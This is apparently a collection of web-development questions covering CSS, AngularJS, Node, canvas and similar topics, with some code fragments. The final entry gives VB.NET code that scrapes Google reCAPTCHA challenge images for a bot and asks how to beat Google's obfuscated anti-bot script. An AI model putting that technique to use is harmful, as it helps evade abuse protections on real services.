How to target alternate odd/even text lines with CSS," Say I've a p element or div element having a text say about 10-15 lines, now my client has a weird call on this, he needs odd/even lines having different text color. Say Line 1 - Black, so Line 2 should be Grey, Line 3 should be again black and so on...So I decided using span's and changed the color but variable resolution is killing things here, Am aware of the :first-line selector (Which won't be useful in this case), also selectors like :odd & :even will be ruled out here as am not using tables, so is there any way I can achieve this using CSS or do I need to use jQuery?

"Implement ""window.setTimeout"" with JavascriptCore"," I am using JavaScriptCore library inside iOS application and I am trying to implement setTimeout function.

"Dynamic resources (Javascript, CSS) in ASP.NET MVC"," ASP.NET allows to generate HTML dynamically using server tags (razor or ASPX). But Is there any good way to generate *.js or *.css content the same way, other than using inline(embedded) CSS/Javascript. Nowadays with technologies like Ajax more and more logic moves from server-side to client side in Javascript. It would be great to have that opportunity to generate JS dynamically using all flexibility that ASP.NET provides for HTML generation.For example, my Javascript contains Knockout view model declaration with initial data loaded from server during Javascript rendering, and some additional js-functions, so in my Html instead of embedded scripts I want to have script references like that: Another example, where developer might need it is using user-profile based CSS. User profile information contains style information (fonts, colors, not just theme) that must be respected during CSS generation, so In my view I will have something like: CurrentUserOverrides.css will be generated dynamically based on profile data of authenticated user.How to do that using ASP.NET MVC?

"""Tooltip"" popup div rendering glitch in Google Chrome - need fix or workaround"," My users and I are running into a rendering glitch in Chrome only (on both Windows and Mac) where an overlaid div that I'm using for on-hover tooltip-style ""popouts""(see first image below) does not get rendered properly in certain cases (see second image below). In all other browsers I've tested, it works as expected.Here's how the hover popouts are supposed to look (and what happens in Firefox, Safari, IE): Here's what happens in Chrome: You can see it in action on this site if you look at May 24 using a browser window width of ~ 1200px (significnatly wider or narrower windows do not seem to work). The glitch only affects the popouts in the bottom right of the menu that are popping left, e.g. those on May 24. Hovers using the same exact mechanism higher up in the page work just fine. Glitched popouts are invisible (except for part of the carat), but if you click on the link to lock the popout in place and then hold left click while moving your mouse around as if to ""select text"" in the area where the popout should be, it will then render partially. Also if I open dev tools and try to select the popout, it will render just fine at that point. I've been looking at this all day and trying different work arounds with opacity, z-index, etc. and getting nowhere. Does this glitch ring any bells for anyone? Is there a way to force Chrome to render the div, once its been positioned and unhidden? I'm fine with any work-around or hack. I use a custom (and fairly complicated) jquery plugin for popouts. If it would be helpful to see the non-minified javascript for the plugin, I can post or provide a link to that, but general guidance that leads me to a work around will be sufficient to be accepted as an answer.

Can JavaScript ajax leads to dead locks .?," I have a thought experiment. In my code I have a global variable say var changeMe; and I'm making few Ajax calls. So changeMe value will depend on which Ajax call finishes last, which means the call that finishes last will overwrite the value.What if both calls finish exactly at the same time, same timestamp?Since Javascript is single-threaded we normally won't get this problem, but this may arise in the case of setTimeout and Ajax calls. I don't know how I can replicate this issue with precision, so it still remains a thought experiment.So how in multi-threaded conditions is a deadlock handled?I prefer an answer like changeMe will be url1 or url2 , and a clear situation explanation..Thanks in advance <code>  //call One -- third param is the callback function ajaxFunction(url1, params,function(data){ changeMe = data; });//call Two ajaxFunction(url2, params,function(data){ changeMe = data; });",Can Javascript Ajax lead to deadlocks?

jQueryMobile:refresh after dynamically adding rows to a table with column toggle," I have a problem regarding the jQueryMobile ""column toggle table mode"". After adding rows dynamically via Javascript, the toggling gets wrong. Not that it doesn't work at all, but it somehow gets confused, swaps columns or similar strange behaviour. I am fully aware that there is a ""refresh""-method exactly for this scenario, but it doesn't work in my example. I also looked at How to refresh JQuery mobile table after a row is added dynamically, but it doesn't really apply to my problem. The only other similar question I found was old and related to version <=1.3.0 of JQM, when no refresh-method existed.I have this table And this Javascript code that updates it: .

The webpage should show up with some sample data which is hardcoded in the HTML. The columns are toggling correctly. Click the button that triggers an update similar to the way it would be updated automatically in my original application. This empties the table and re-adds the same content. Afterwards I call the refresh-method of JQM.

Javascript - String Literal vs String Object," Taken from MDN String literals (denoted by double or single quotes) and strings returned from String calls in a non-constructor context (i.e., without using the new keyword) are primitive strings. JavaScript automatically converts primitives to String objects, so that it's possible to use String object methods for primitive strings. In contexts where a method is to be invoked on a primitive string or a property lookup occurs, JavaScript will automatically wrap the string primitive and call the method or perform the property lookup.So, I thought (logically) operations (method calls) on string primitives should be slower than operations on string Objects because any string primitive is converted to string Object (extra work) before the method being applied on the string.But in this test case, the result is opposite. The code block-1 runs faster than the code block-2, both code blocks are given below:code block-1 : code block-2 : The results varies in browsers but the code block-1 is always faster. Can anyone please explain this, why the code block-1 is faster than code block-2. <code>  var s = '0123456789';for (var i = 0; i < s.length; i++) { s.charAt(i);} var s = new String('0123456789');for (var i = 0; i < s.length; i++) { s.charAt(i);}",What is the difference between string primitives and String objects in JavaScript?

AngularJS - Not sure how to hide a div when clicking OUTSIDE of the div," This is a follow-up question to this question: AngularJS input with focus kills ng-repeat filter of listBasically my code is using AngularJS to pop-out a div (a drawer) on the right for filtering a list of things. Most times this is used the UI is blocked so clicking on that blocking div closes the drawer. But in some cases we don't block the UI and need to allow the user to click outside of the drawer to cancel the search or select something else on the page. My initial thought was to attach a window.onclick handler when the drawer opens and if anything is clicked other than the drawer it should close the drawer. That's how I would do it in a pure JavaScript app. But in Angular it is being a bit more difficult.Here is a jsfiddle with a sample that I based on @Yoshi's jsBin example: http://jsfiddle.net/tpeiffer/kDmn8/The relevant piece of code from this sample is below. Basically if the user clicks outside of the drawer I invoke $scope.toggleSearch so that $scope.open is set back to false.The code works, and even though the $scope.open goes from true to false it doesn't modify the DOM. I'm sure this has something to do with the lifecycle of events or perhaps when I modify $scope (since it is from a separate event) that it is a copy and not the original...The ultimate goal on this will be for it to be a directive for ultimate reusability. If anyone can point me in the right direction to do that I would be grateful. and <code>  $scope.toggleSearch = function () { $scope.open = !$scope.open; if ($scope.open) { $scope.$window.onclick = function (event) { closeSearchWhenClickingElsewhere(event, $scope.toggleSearch); }; } else { $scope.$window.onclick = null; }}; function closeSearchWhenClickingElsewhere(event, callbackOnClose) { var clickedElement = event.target; if (!clickedElement) return; var elementClasses = clickedElement.classList; var clickedOnSearchDrawer = elementClasses.contains('handle-right') || elementClasses.contains('drawer-right') || (clickedElement.parentElement !== null && clickedElement.parentElement.classList.contains('drawer-right')); if (!clickedOnSearchDrawer) { callbackOnClose(); }}",Not sure how to hide a div when clicking OUTSIDE of the div

Will a browser stop lazy loading a script if it is already in the browser cache?," I'm using lazyload.js to lazy load several scripts. Now I was thinking of just using a site-wide include which tells lazyload.js to load all scripts used on my site. Then I could let the browser decide if any of these scripts is already in the cache or not (and to load them if necessary).That saves me from having to do testing in js whether something is already loaded (and I'm willing to accept the overhead of a couple of extra requests being made). Would it work that way, or am I overlooking something? <code> ",Will a browser still lazy load a script if it is already in the browser cache?

Samsung Galaxy Tab 2 duplicating HTML5 canvas," This is a weird issue that I am only experiencing on a Native browser on Samsung Galaxy Tab 2 and Galaxy S2 in the native browser.

As there is a duplicate canvas element, that updates as the main canvas does.Here it appears asthough it only happens when rotated in landscape mode, but I beleive that in portrait mode, the canvas' are perfectly aligned over the top.What is even weirder, the menu button that you see is a toggle button, tap to open menu, tap to close menu. On this device when you tap it, it opens and closes instantly. the same happens for the mute button toggle.I'm completely at a loss.I have done some javascript debugging throwing in a few alerts here and there, and the initialisation functions that create references to the canvas and so on are only called once.I have read and heard about hardware acceleration causing issues, but solutions i've potentially found are only relative to building native apps! not HTML5 Canvas webpages.Any insight on this could be would be great!Thanks in advance.--EDITI also put in this test alert(document.getElementsByTagName('canvas').length); to see if there was 2 canvas in the DOM but it returns 1! <code> ",Android Native Browser duplicating HTML5 canvas (fine in chrome)

Node JS: Cursor.toArray() not fireing," So I'm following a Node.js tutorial course on tutsplus.com which up until now has been great.I am on the lesson regarding MongoDB and I have come a bit unstuck. I'm not sure why this doesn't work for me as it's working in the video and my code is the same. All I can think is that there has been an update since the course was made a year ago.From trying to console.log at various points I think the data is not inserting correctly in the beginning and so nothing is returned.Everything appears to fire as expected except the callback for cursor.toArray().I'm currently learning node and mongodb so please bear with me if I've made an obvious mistake.I have been instructed to write the following file and then execute it in the command line.EDIT:I have narrowed the problem down to the insert script. When inserting the data via the CLI it will retrieve it back. <code>  var mongo = require('mongodb'), host = ""127.0.0.1"", port = mongo.Connection.DEFAULT_PORT, db = new mongo.Db('nodejsintro', new mongo.Server(host, port, {}));db.open(function(err){ console.log(""We are connected!

MVC Ace Editor Not Working after Bundle Minification," I've been working on an MVC web application that uses the Ace in-browser code editor provided by Cloud9.

Does using .call() make a difference," I'm looking at some code that looks like Or in some other cases Is there any difference between these and Are there any circumstances where the behavior would be different?

I can't think of a way where one would throw an exception and the other wouldn't, but maybe I'm missing something...)EDIT: To clarify: yes, I know that .call can be used to specify the this value seen by the function, and it can be useful in cases where you can't use the obj.f() syntax (because f isn't a property of obj or you don't know whether it is). My question isn't about how .call works in general. My question is about this case, where I can't see an obvious reason for using .call as opposed to the object-property syntax.  <code>  this.f.call(this); this.someObj.f.call(this.someObj); this.f();this.someObj.f();","Is there a difference between x.f.call(x, ...) and x.f(...)?"

I seem to run into a fair amount of JS that is minifed and would like the quickest and best way to get the job done. I couple sites I have tried seem to have problems with it, is there a program I could install that would just allow me to short cut it with a hot-key or something. That would be pretty handy.

And again if not what is the most reliable website/program that I can use to do this. Like I said I can see there have been answers and I appreciate all of them. I will be leaving this question open for a while to get more people to look at it and possibly give a better answer. Keep it up guys!

Does it depend on the browser or is it just a problem of scoping or maybe something else that I have ignored? <code>  var _z = console;Object.defineProperty( window, ""console"", { get : function(){if( _z._commandLineAPI ){ throw ""Script execution not permitted"" } return _z; }, set : function(val){ _z = val }});",How to disable JavaScript function calls from the browser console?

In FabricJs how would I modify the object class so all sub-classes will have a new custom attribute?," I am looking for a way to extend the base fabric.Object class with a custom attribute I can save to JSON and load from JSON that would propagate all the way into the various sub classes.Specifically i want to store a depth attribute so when i load the objects from the JSON i will be able to add the appropriate parallax to the object.I imagine the solution would include modifying the fabric.Object.prototype. But i am still learning how to work with prototypes.Here is some examples of what i have tried:http://www.sitepoint.com/fabric-js-advanced/ This does a great job at giving the specific object 'rect' the attribute desired, as well as making it available in the toJSON() method. But it fails to make it available for all objects and when i use loadFromJSON() it does not contain the new attribute.Any help would be appreciated!Other resources that got me closer to a solution:Fabric.js - how to save canvas on server with custom attributes  - Creates a subclass with the custom attributes but nothing inherits from it.https://github.com/kangax/fabric.js/wiki/Adding-additional-object-properties-to-serialized-JSON  - completely rewrites the methods needed in order to include custom attributes (I would prefer not to modify the core of fabricjs) <code>  // create a rectangle objectvar rect = new fabric.Rect({ left: 100, top: 100, fill: 'red', width: 20, height: 20});rect.toObject = (function (toObject) { return function () { return fabric.util.object.extend(toObject.call(this), { depth: 10 }); };})(rect.toObject);",In Fabric.js how do I modify the object class so all sub-classes will have a new custom attribute?

Multiple rectangles being masked with globalCompositeOperation," I am attempting to draw multiple rectangles and then mask those using globalCompositeOperation 'source-in' which works great, but the issue is that when i fill my rectangles they disappear...

But if I do this, and remove the mask - I have each rectangle and they respect their fill styles.

How to hide drop down menu on document click using AngularJS?," I have created a horizontal drop down menu using AngularJS.The menu section is managed by an angular controller called menuController. Standard menu behavior is implemented, so that on hover main menu item gets highlighted unless it is disabled. On clicking the main menu item, the sub menu toggles. If Sub menu is in a open state, I want it to go away when user clicks anywhere else on the document. I tried to create a directive to listen for document click event but not sure on how to notify menu-controller about it. How should I implement this scenario in a AngularJS way?Partially working Original Plunk without document click handling mechanism.UPDATE:Based on answered suggestion, I went with Brodcast approach and updated the script to reflect my latest changes. It is working as per my expectation. I made the globalController $broadcast a message and menuController subscribe to that message.UPDATE 2: Modified code to inject global events definition data. UPDATE 3: Modified code in previous implementation to fix a bug where document click fires multiple times. Almost similar approach, but this time, if any one clicks again anywhere on the menu, the click is ignored. Please refer to the New Working Plunk for full code example UPDATE 4: Implemented another alternate option.

Is there a better way to fix this than to call .find(""test"") on the object?EditTo clarify, I'm not asking why the xml tag is added, rather, I'm wondering why the .find() call get's rid of it. It doesn't make sense to me. <code>  $(document).ready(function() { // this seems fine in IE9 and 10 var $div = $(""<div>""); console.log(""In IE, this <div> is just fine: "" + $div[0].outerHTML); // this is weird in IE var $test = $(""<test>""); console.log(""However, this <test> has an xml tag prepended: \n"" + $test[0].outerHTML); $test.find(""test""); console.log(""Now, it does not: \n"" + $test[0].outerHTML); console.log(""Why does this behave this way?"");});",Why creating the elements with custom tags adds the xml namespace in the outerHTML in IE9 or 10 until the .find() method is called?
AngularJS directive gets not updated if scope variable changes," I've tried to write a small directive, to wrap its contents with another template file.This code: Should have this output: Because the layout ""Default"" has this code: Here the code of the directive: });My problem:When I'm using scope variables in template (in layout template or inside of layout tag), eg. {{whatever}} it just work initially. If I update the whatever variable, the directive is not updated anymore. The whole link function will just get triggered once.I think, that AngularJS does not know, that this directive uses scope variables and therefore it will not be updated. But I have no clue how to fix this behavior. <code>  <layout name=""Default"">My cool content</layout> <div class=""layoutDefault"">My cool content</div> <div class=""layoutDefault"">{{content}}</div> app.directive('layout', function($http, $compile){return { restrict: 'E', link: function(scope, element, attributes) { var layoutName = (angular.isDefined(attributes.name)) ? attributes.name : 'Default'; $http.get(scope.constants.pathLayouts + layoutName + '.html') .success(function(layout){ var regexp = /^([\s\S]*?){{content}}([\s\S]*)$/g; var result = regexp.exec(layout); var templateWithLayout = result[1] + element.html() + result[2]; element.html($compile(templateWithLayout)(scope)); }); }}",AngularJS directive does not update on scope variable changes
return response before http-on-examine-response," I am developing a Firefox addon, which needs to intercept the HTTP request process and return a fake response for certain URLs.

Angular Click outside of an element event," I know there are many questions ask similar thing. But no one really solve my issue.I'm trying to build an directive which will execute an expression when mouse click outside the current element.Why I need this function? I'm building an app, in this app, there are 3 dropdown menu, 5 dropdown list(like chosen). All these are angular directives. Let's assume all these directives are different. So we have 8 directives. And all of them need a same function: when click out side the element, need hide the dropdown.I have 2 solutions for this, but both got issue:Solution A: Here is an example for solution A: click here When you click the first dropdown, then working, then click second input, the first should hide but not.Solution B: Here is example for solution B: click hereSolution A working if there is just one directive in the page but not in my app. Because it's prevent bubbling, so first when I click on dropdown1, show dropdown1, then click on dropdown2, click event be prevent, so dropdown1 still showing there even I click outside the dropdown1.Solution B working in my app which I'm using now. But the issue is it's cause a performance issue. Too many click event be handled on every single click on anywhere in the app. In my current case, there are 8 click event bind with document, so every click execute 8 functions. Which cause my app very slow, especially in IE8.So is there any better solution for this? Thanks <code>  app.directive('clickAnywhereButHere', function($document){ return { restrict: 'A', link: function(scope, elem, attr, ctrl) { elem.bind('click', function(e) { // this part keeps it from firing the click on the document. e.stopPropagation(); }); $document.bind('click', function() { // magic here. scope.$apply(attr.clickAnywhereButHere); }) } }}) app.directive('clickAnywhereButHere', ['$document', function ($document) { directiveDefinitionObject = { link: { pre: function (scope, element, attrs, controller) { }, post: function (scope, element, attrs, controller) { onClick = function (event) { var isChild = element.has(event.target).length > 0; var isSelf = element[0] == event.target; var isInside = isChild || isSelf; if (!isInside) { scope.$apply(attrs.clickAnywhereButHere) } } $document.click(onClick) } } } return directiveDefinitionObject}]);",Directive that fires an event when clicking outside of the element
Confusion about EventEmitter in node," I was reading over this small article to understand inheriting from EventEmitter, but I'm a little confused.He does this: https://gist.github.com/chevex/7646362Why does he manually invoke the EventEmitter constructor with his own constructor's this? Also, why does he set the prototype of his contsructor's prototype to the prototype of EventEmitter? That's super confusing to me.Then someone in the comments suggested he do this instead, which seemed more elegant: https://gist.github.com/chevex/7646447This seems WAY cleaner than the other way, though that's probably just because I fail to understand what's going on in the first instance. I would not be surprised if util.inherits is doing the same thing as the first example.The second one at least makes a little sense to me, but I still don't understand why they don't just do this: https://gist.github.com/chevex/7646524Can anyone explain to me what the differences between all of these approaches is and why in the first two they invoke .call(this) on the EventEmitter constructor? I omitted that line while trying out the examples and they still worked. <code>  function Door() { events.EventEmitter.call(this); this.open = function() { this.emit('open'); };}Door.prototype.__proto__ = events.EventEmitter.prototype; function Door() { events.EventEmitter.call(this); this.open = function () { this.emit('open'); }}util.inherits(Door, events.EventEmitter); function Door() { this.open = function () { this.emit('open'); }}Door.prototype = new events.EventEmitter();",How should you inherit from EventEmitter in node?

AngularJS + UI-Bootstrap passing parameters to modal dialog," I'm trying to use a simple modal dialog for editing an item in a list in the context of an Angular app. For modals I'm using UI-Bootstrap (AngularUI), which I know has still issues with Bootstrap 3 but AFAIK can be used for modals with some simple workarounds (unless building the not-yet-released branch of AngularUI).

Also, the CSS contains some workarounds for dealing with AngularUI issues with Bootstrap 3. The modal dialog is displayed, but it does not receive the parameter passed from the calling controller. To pass this parameter (a dummy item object with an id and a name) I use the resolve option in the modal open method call, like: Yet, the item parameter which should be resolved in the dialog controller appears to be undefined.

WebRTC ~ Possible to connect when knowing IP and PORT without using ICE, I know there is lot's of documentation about WebRTC out there so I am sorry if I missed it:My question is the following:Is it possible to connect from client to client without using an intermediate server. ( Including an intermediate server to set up the connection )Take as example two clients that know each other IP addresses and the ports they are using for RTC. Both did they already downloaded the webpage. Is it possible for them to connect without an intermediate signal server?I hope you would point me to a good source of how this is possible! Or why not!Thanks <code> ,WebRTC ~ Possible to connect when knowing IP and PORT without using Intermediate Servers

web workers vs promises," In order to make a web app responsive you use asynchronous non-blocking requests. I can envision two ways of accomplishing this. One is to use deferreds/promises. The other is Web Workers. With Web Workers we end up introducing another process and we incur the overhead of having to marshal data back and forth. I was looking for some kind of performance metrics to help understand when to chose simple non-blocking callbacks over Web Workers.Is there some way of formulating which to use without having to prototype both approaches? I see lots of tutorials online about Web Workers but I don't see many success/failure stories. All I know is I want a responsive app. I'm thinking to use a Web Worker as the interface to an in-memory data structure that may be anywhere from 0.5-15MB (essentially a DB) that the user can query and update.As I understand javascript processing, it is possible to take a single long-running task and slice it up so that it periodically yields control allowing other tasks a slice of processing time. Would that be a sign to use Web Workers? <code> ",Web Workers vs Promises
three.js : how to set the first lookAt/target of a Control," I need to set the initial 'lookAt' point of the scene, that will be the center of the screen and of the control's rotation.If possible, I would prefer to set a point (or an object's position), not rotation angles.The control is OrbitControl. If I simply set lookAt before the Control initialization, the center is restored to (0,0,0) on the first user interaction, which causes a 'gap' ... How can I set the initial point in a proper way? <code>  // cameracamera = new THREE.PerspectiveCamera( 35, window.innerWidth / window.innerHeight, 0.1, 20000);camera.position.set(0,20,20);camera.lookAt(new THREE.Vector3(0,10,0));// controlscontrols = new THREE.OrbitControls( camera );controls.addEventListener( 'change', render );",how to set the first lookAt/target of a Control

What is the reason Javascript setTimeout is so inaccurate?," I got this code over here: In my computer, it always executes correctly, with 1000 in the console output. Interestedly in other computer, the same code, the timeout callback starts in less than a second and the difference of currentDate - date is between 980 and 998.I know the existence of libraries that solve this inaccuracy (for example, Tock).Basically, my question is: What are the reasons because setTimeout does not fire in the given delay? Could it be the computer that is too slow and the browser automatically tries to adapt to the slowness and fires the event before?PS: Here is a screenshot of the code and the results executed in the Chrome JavaScript console: <code>  var date = new Date();setTimeout(function(e) { var currentDate = new Date(); if(currentDate - date >= 1000) { console.log(currentDate, date); console.log(currentDate-date); } else { console.log(""It was less than a second!""); console.log(currentDate-date); }}, 1000);",What is the reason JavaScript setTimeout is so inaccurate?

Zooming out a div using CSS," I have a DIV that is covering the whole page (height and width are 100%). I am trying to use CSS (and possibly JavaScript) to create a zoom out animation effect so the DIV is smaller (making everything inside the div - its children - smaller as well) to a specific point on the page (middle of the page) and to a specific width and height (let's say 100 * 100px for example).I am starting with the following code: The issue with this code is that it zooms out on component down (the parent div) and immediately zooms out what's inside it then goes back to zoom in the components. Basically it is a little buggy. Any helpful fixes to make it zoom out everything together? It would be great if I can zoom out everything together to a specific location on the page and to a specific width/height (for example, zoom everything out to left: 100px, top: 100px and the parent div should be: 100px * 100px and everything else is relative in size).I understand this might be easier with JavaScript? Any help?One final note, if you notice the animation is not really reflecting a zoom animation. Although this would be an additional plus, the actual zoom animation would be great.JSFiddle link to make it easier: http://jsfiddle.net/HU46s/ <code>  <div id=""toBeZoomedOut""> <div>something</div> <div><img src=""background.jpg""></div></div>#toBeZoomedOut { background-color: black; border: 1px solid #AAAAAA; color: white; width: 300px; height: 300px; margin-left: auto; margin-right: auto; -webkit-transition: 1s ease-in-out; -moz-transition: 1s ease-in-out; transition: 1s ease-in-out;}#toBeZoomedOut img { height: 250px; width: 250px;}#toBeZoomedOut:hover { zoom: 0.5;}",How to zoom out a div using animations?

Here's what I'd like to do: While all three functions get called, the $timeouts all start simultaneously. I can see why this doesn't work, but how do I get what I want? Can I even use promises here? I was previously just arranging the delays so that they cascade, but that seems like more work to maintain... <code>  $timeout(firstFunction, firstDelay).then($timeout(secondFunction, secondDelay)).then($timeout(thirdFunction, thirdDelay));",Chaining angular $timeout

Different between factory and service in AngularJS?," EDIT Jan 2016: Since this still gets attention.

Modify file in place using Gulp.js," I have a gulp task that is attempting to convert .scss files into .css files (using gulp-ruby-sass) and then place the resulting .css file into the same place it found the original file. The problem is, since I'm using a globbing pattern, I don't necessarily know where the original file is stored. In the code below I'm trying to use gulp-tap to tap into the stream and figure out the file path of the current file the stream was read from: Based on the output of the console.log(fileLocation), this code seems like it should work fine. However, the resulting CSS files seem to be placed one directory higher than I'm expecting. Where it should be project/sass/partials, the resulting file path is just project/partials. If there's a much simplier way of doing this, I would definitely appreciate that solution even more.

How can I dynamically figure out where to put the jquery blockUI message when inside a jquery ui dialog with vertical scroll bar?," I have a case where I am using a jquery ui dialog and I have any html table in the dialog where the dialog is fixed height: I call an AJAX query from a button click and I want to use jquery UI blockUI plugin to show a ""loading"" message.

Is \0 a valid escape sequence in C++ regular expressions?," NOTE: When I say the regex [\0] I mean the regex [\0] (not contained in a C-style string, which would then be ""[\\0]"").

Angular Errors when doing DOM manipulation in Controllers or Directives," My main question is simple : I get errors when doing DOM manipulation within Controllers or Directives however, the functionality works perfectly. I would like to ignore these errors, and get the confirmation that it is safe to do so, from a functionality perspective ( not a design perspective ) To keep things simple, I would appreciate a simple answer to this question without questioning my need to do this. Now, if anybody does want to discuss in more detail, I have this gist : https://gist.github.com/kosz/04f916a5725d85045be5 ( dependencies: angular, jquery, jquery ui dialog ) with the code i'm currently experiencing this behaviour in. I have done my best so far, to get rid of this error, and based on what i read, and the docs, dom manipulation in angular seems to be encouraged in the directives. So I've made the code work with a directive, however, it still throws the error !?As you can see I am using Jquery UI and showing it for each list item, if the user wants to edit. I am not directly manipulating the dom, however, i need a way to control the close/open events of the jQuery ui Dialog, which doesn't make Angular fill my console with errors. Any insight on this is greatly appreciated. Please note that I am aware of the angular ui bootstrap modal, and it's not an option for me to use in this particular scenario.  <code>  Error: [$parse:isecdom] Referencing DOM nodes in Angular expressions is disallowed!

How to play wav audio byte array via javascript," I'm using the following method to play a byte array containing wav data. The function is being called from a GWT project.This function plays back sound, but it sounds like some kind of Hellish monster.

bootstrap alert in a fixed floating div at the top of page," I have a web application which uses Bootstrap (2.3.2 - corporate policy, we cannot upgrade to 3.0 without lots of testing across several web applications). We have several long pages within this application that require validation of forms and tables - however due to practical and aesthetic reasons we need to have an alert message appear as a floating div at the top of the page.This will be a fixed floating div, that can be shown and hidden using javascript as and when needed. This part works and I can control this div, whenever I need to flash some information to the user or some error takes place.The layout is like so: The styling is below: The #message div behaves all well and good, but when I try and add some padding to the #message div (to try and get some space between the edge of the page and the div i.e. padding: 5px), the div only gets padding on the left and top and the rest of the div is pushed out too far to the right of the page (hiding part of the 'x' inside the bootstrap alert).Has anyone experienced this before? It seems like a simple enough issue, so am I overlooking something? <code>  <div id=""message""> <div id=""inner-message"" class=""alert alert-error""> <button type=""button"" class=""close"" data-dismiss=""alert"">&times;</button> test error message </div></div> #message { position: fixed; top: 0; left: 0; width: 100%;}#inner-message { margin: 0 auto;}",Bootstrap alert in a fixed floating div at the top of page

AngularJS UI Bootstrap testing modal instance controller," This is a somewhat of a follow-on question to this one: Mocking $modal in AngularJS unit testsThe referenced SO is an excellent question with very useful answer. The question I am left with after this however is this: how do I unit test the modal instance controller? In the referenced SO, the invoking controller is tested, but the modal instance controller is mocked. Arguably the latter should also be tested, but this has proven to be very tricky. Here's why:I'll copy the same example from the referenced SO here: So my first thought was that I would just instantiate the controller directly in a test, just like any other controller under test: This does not work because in this context, angular does not have a provider to inject $modalInstance, since that is supplied by the UI modal.Next, I turn to plan B: use $modal.open to instantiate the controller. This will run as expected: (Note, template can't be an empty string or it will fail cryptically.)The problem now is that I have no visibility into the scope, which is the customary way to unit test resource gathering, etc. In my real code, the controller calls a resource service to populate a list of choices; my attempt to test this sets an expectGet to satisfy the service my controller is using, and I want to validate that the controller is putting the result in its scope. But the modal is creating a new scope for the modal instance controller (using the scope I pass in as a prototype), and I can't figure out how I can get a hole of that scope. The modalInstance object does not have a window into the controller.Any suggestions on the ""right"" way to test this?(N.B.: the behavior of creating a derivative scope for the modal instance controller is not unexpected it is documented behavior. My question of how to test it is still valid regardless.) <code>  .controller('ModalInstanceCtrl', function($scope, $modalInstance, items){ $scope.items = items; $scope.selected = { item: $scope.items[0] }; $scope.ok = function () { $modalInstance.close($scope.selected.item); }; $scope.cancel = function () { $modalInstance.dismiss('cancel'); };}); beforeEach(inject(function($rootScope) { scope = $rootScope.$new(); ctrl = $controller('ModalInstanceCtrl', {$scope: scope});}); beforeEach(inject(function($rootScope, $modal) { scope = $rootScope.$new(); modalInstance = $modal.open({ template: '<html></html>', controller: 'ModalInstanceCtrl', scope: scope });});",Testing AngularUI Bootstrap modal instance controller

How to open a new tab in CasperJS on the testing Framework," I am using CasperJS testing framework to make some test suite since almost a month now, but I am facing a problem in one of them.Here is what I want to do: I am browsing a url (page1) and I have to make another action from an another url (simulate a new tab like we have on our graphics browser) without quitting the first one (page1). The action from the second url is going to change my first one. Hope it's clear enough :)So for now when I reach the step to observe that on my first url I open the second one by doing a thenOpen(), so it's making a new navigation step and I am losing the current session and I cannot come back on it. I try many way such as using the history, reopen the page, using the event from CasperJS and also I try with PhantomJS but without success.Here is some pseudo code to make it clearer: I really would like to use CasperJS to do that but I start to think it is not possible, and I am starting to look in different solution such as this post: CasperJS, parallel browsing WITH the testing framework.

Getting Bad Captcha Image from Google ReCaptcha Scrapping," I'm trying to load Captcha's faster then rendering them in a WebBrowser Control then copy/pasting the image and rendering it into a picturebox.Why not just download the picture right into the PictureBox right away which has the advantage of using less CPU Usage and memory pretty much this solution works for any other captcha service which is more advanced called Solve Media (with Solve Media if you view the image url the next time you try to view it, it gives you a fake error catpcha image).But now I need support for ReCaptcha Captcha system as well for the use of automating my bot at a faster pace then just refreshing a webpage and waiting for it to render.So I'll just write my code here as far as I understand I'm just missing emulating one of the properties in HTML Request I got the User-Agent faked as a real Internet Explorer 8, I think the problem is the Cookie seems somehow it generates a cookie I can't figure out where, but I also get one Cookie I think from downloading the Javascript file.Either way Google ReCaptcha tries to trick you with a fake Captcha which you cannot read to rub it in your face that you are not doing something right. I figured out when you see the 2 Black circles then its obvious it's fake.Here is a example of Bad Captcha and Good CaptchaAt one point I remember ReCaptcha had another security feature which somehow knew if you loaded the Captcha image from the actual domain where it's placed I don't know how that worked since I download everything locally right? but they seem to have removed that feature anyways. (Actually it exists on some websites seems to be disabled by default, easy to trick it uses Referer header)I'm not trying to cheat anything here I will still be typing in these Captcha's manually by hand but I want to type them in faster then required rendering the page normally is.I want the Captcha's to become either those street numbers.. or at least 2 words without those black circles.Anyways here is my Current Code. Here is the HTTP class I use. EDIT: I figured out the problem it's this Google Javascript Clientside Obfuscated Encryption system at http://www.google.com/js/th/1lOyLe_nzkTfeM2GpTkE65M1Lr8y0MC8hybXoEd-x1s.jsI still want to be able to defeat it without using a heavy webbrowser maybe some lightweight fast javascript evaluate control?No point in unobfuscating it and porting it over to VB.NET because as soon as I do it they might change a few variables or the encryption completely and I did all that work for nothing, so I want something that's more intelligent. At this point I don't even know how the URL is generated it does seem static for now and it's probably a real file not just in time generated file.Turns out the _challenge page which gives the challenge for the image is just a decoy challenge.. that challenge then gets replaced (encrypted perhaps?) client-sided using variables t1, t2, t3, seems this encryption is not used each time, if you pass it once you get access to do what I am trying to do pretty much my code works but it stops working at very random intervals, I want something more solid which I can leave unattended for weeks. <code>  Dim newCaptcha = New CaptchaDim myUserAgent As String = """"Dim myReferer As String = ""http://www.google.com/recaptcha/demo/""Dim outputSite As String = HTTP.HTTPGET(""http://www.google.com/recaptcha/demo/"", """", """", """", myUserAgent, myReferer)Dim recaptchaChallengeKey = GetBetween(outputSite, ""http://www.google.com/recaptcha/api/challenge?k="", """""""")'Google ReCaptcha CaptchaoutputSite = HTTP.HTTPGET(""http://www.google.com/recaptcha/api/challenge?k="" & recaptchaChallengeKey, """", """", """", myUserAgent, myReferer)'outputSite = outputSite.Replace(""var RecaptchaState = {"", ""{""""RecaptchaState"""": {"")'outputSite = outputSite.Replace(""};"", ""}}"")'Dim jsonDictionary As Dictionary(Of String, Object) = New JavaScriptSerializer().Deserialize(Of Dictionary(Of String, Object))(outputSite)Dim recaptchaChallenge = GetBetween(outputSite, ""challenge : '"", ""',"")outputSite = HTTP.HTTPGET(""http://www.google.com/recaptcha/api/js/recaptcha.js"", """", """", """", myUserAgent, myReferer) 'This page looks useless but it seems the javascript loads this anyways, maybe this why I get bad captchas?If HTTP.LoadWebImageToPictureBox(newCaptcha.picCaptcha, ""http://www.google.com/recaptcha/api/image?c="" & recaptchaChallenge, myUserAgent, myReferer) = False Then MessageBox.Show(""Recaptcha Image loading failed!"")Else Dim newWork As New Work newWork.CaptchaForm = newCaptcha newWork.AccountId = 1234 'ID of Accounts. newWork.CaptchaHash = ""recaptcha_challenge_field="" & recaptchaChallenge newWork.CaptchaType = ""ReCaptcha"" Works.Add(newWork) newCaptcha.Show()End If Imports System.Collections.GenericImports System.LinqImports System.TextImports System.NetImports System.IOPublic Class HTTP Public StoredCookies As New CookieContainer Public Function HTTPGET(ByVal url As 